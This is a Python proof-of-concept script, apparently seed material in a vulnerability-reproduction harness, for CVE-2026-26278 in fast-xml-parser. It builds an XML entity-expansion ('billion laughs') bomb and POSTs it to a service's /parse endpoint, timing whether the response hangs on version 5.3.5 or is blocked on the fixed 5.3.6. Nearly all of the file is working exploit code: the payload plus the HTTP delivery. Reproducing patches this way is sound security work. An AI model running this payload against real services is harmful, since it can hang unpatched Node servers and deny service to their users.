#!/usr/bin/env python3
"""[GIVEN] original_poc -- CVE-2026-26278 seed exploit, delivered over EXTERNAL HTTP.

The classic fast-xml-parser entity-expansion (billion-laughs-style) bomb: a small DOCTYPE-declared
entity referenced many times. Delivered as a real HTTP POST of an XML body to the service's /parse
endpoint (`new XMLParser({processEntities:true}).parse(req.body)`), which runs SYNCHRONOUSLY on the
Node event loop, so an unbounded expansion HANGS the HTTP response.

    <?xml version="1.0"?>
    <!DOCTYPE r [
    <!ENTITY a "AAAA...(5000 A's)">
    ]>
    <r>&a;&a;...(2000x)</r>

fast-xml-parser resolves DOCTYPE entities in OrderedObjParser.replaceEntitiesValue()'s DOCTYPE loop.
On V0 (5.3.5) that loop is UNCOUNTED -> `&a;`x2000 expands to ~10 MB and the entity loops churn ->
the parse hangs (HTTP timeout). On V1 (5.3.6, the CVE-2026-26278 fix) the DOCTYPE loop now counts
expansions and throws `Entity expansion limit exceeded: 2000 > 1000` after 1000 references, so the
response returns in ~2 ms. The block on V1 is exactly the maxTotalExpansions accounting the
CVE-2026-26278 fix added to this DOCTYPE loop.

Expected: SLOW (response hangs -> HTTP timeout) on V0 (5.3.5); FAST/bounded on V1 (5.3.6) and V2.

Usage: original_poc.py http://127.0.0.1:34920
"""
import http.client
import json
import socket
import sys
import time

PAYLOAD = ('<?xml version="1.0"?>\n<!DOCTYPE r [\n<!ENTITY a "%s">\n]>\n<r>%s</r>'
           % ("A" * 5000, "&a;" * 2000))
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    data = PAYLOAD.encode("utf-8")
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/parse", body=data,
                  headers={"Content-Type": "text/xml", "Content-Length": str(len(data))})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:34920"
    out = run(base)
    print(json.dumps({"poc": "original/CVE-2026-26278-doctype-bomb", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
